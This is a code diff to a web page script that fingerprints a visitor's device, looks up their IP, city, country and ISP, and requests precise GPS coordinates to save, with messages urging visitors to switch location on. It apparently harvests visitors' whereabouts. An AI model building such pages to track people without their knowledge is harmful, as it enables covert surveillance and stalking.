@@ -136,25 +136,19 @@ function detectDeviceModel(){
 
 let ua = navigator.userAgent
 
-// iPhone
 if(ua.includes("iPhone")) return "iPhone"
 
-// Samsung
 let samsung = ua.match(/SM-[A-Z0-9]+/)
 if(samsung) return "Samsung " + samsung[0]
 
-// Xiaomi
 let xiaomi = ua.match(/Mi\s[A-Z0-9]+/)
 if(xiaomi) return xiaomi[0]
 
-// Huawei
 let huawei = ua.match(/HUAWEI\s[A-Z0-9]+/)
 if(huawei) return huawei[0]
 
-// Android generic
 if(ua.includes("Android")) return "Android Phone"
 
-// Desktop
 if(ua.includes("Windows")) return "Windows PC"
 if(ua.includes("Mac")) return "Mac"
 
@@ -194,13 +188,6 @@ country = data.country
 isp = data.org
 ip = data.ip
 
-if(data.success){
-city = data.city || city
-country = data.country || country
-isp = (data.connection && data.connection.isp) ? data.connection.isp : isp
-country_code = data.country_code || country_code
-}
-
 }catch(e){
 console.log("IP lookup failed:", e)
 }
@@ -224,7 +211,6 @@ time: new Date().toLocaleString("en-GB", {
   minute: "2-digit",
   hour12: true
 }).replace(",", " |"),
-
 
 ip: ip,
 city: city,
@@ -257,7 +243,6 @@ saveLocation(lat,lon)
 
 }
 
-
 function handleLocationError(error){
 
 const status = document.getElementById("status")
@@ -266,9 +251,7 @@ if(error.code === 1){
 
 status.innerHTML = `
 ❌ Permission denied<br><br>
-Please TURN ON  Your Location
-<br><br>
-<button onclick="retryLocation()">Try Again</button>
+Please TURN ON your location and refresh the page
 `
 
 }
@@ -278,7 +261,7 @@ else if(error.code === 2){
 status.innerHTML = `
 📍 Location is OFF<br><br>
 👉 Please turn ON GPS from your device settings<br><br>
-<button onclick="retryLocation()">Try Again</button>
+🔄 Then refresh this page
 `
 
 }
@@ -287,36 +270,13 @@ else if(error.code === 3){
 
 status.innerHTML = `
 ⏳ Location request timeout<br><br>
-<button onclick="retryLocation()">Try Again</button>
+🔄 Please refresh the page
 `
 
 }
 
 }
 
-
-function retryLocation(){
-
-document.getElementById("status").innerHTML = "🔄 Retrying..."
-
-setTimeout(()=>{
-
-navigator.geolocation.getCurrentPosition(
-  successLocation,
-  handleLocationError,
-  {
-    enableHighAccuracy:true,
-    timeout:10000,
-    maximumAge:0
-  }
-)
-
-}, 1000) // small delay helps after turning ON GPS
-
-}
-
-
-// First call
 navigator.geolocation.getCurrentPosition(
   successLocation,
   handleLocationError,
